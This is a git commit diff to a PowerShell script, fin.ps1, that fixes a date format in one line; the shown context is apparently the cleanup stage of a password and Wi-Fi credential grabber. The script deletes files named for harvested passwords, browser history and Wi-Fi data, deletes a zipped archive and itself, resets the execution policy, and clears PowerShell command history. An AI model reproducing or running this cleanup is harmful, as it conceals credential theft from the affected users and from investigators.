10b72d3ffeeff3e505401d5c8c786be73df3425d
L Shaf <shafry2008@gmail.com>
2023-05-07 17:41:17 +0700

    🐜 fix broken name

--- other_files/fin.ps1
+++ other_files/fin.ps1
@@ -5,7 +5,7 @@ Remove-Item dust_passwords.txt
 Remove-Item dust_history.txt
 Remove-Item dust_wifi.txt
 # Remove-Item dust_connected_devices.txt # no more used
-Remove-Item "$env:UserDomain$(Get-Date -Format yyyymmdd).zip"
+Remove-Item "$env:UserDomain$(Get-Date -Format yyyyMMdd).zip"
 Remove-Item fin.ps1
 Set-ExecutionPolicy restricted -Force #Reset script blocker
 Clear-Content (Get-PSReadlineOption).HistorySavePath #Clear powershell command history
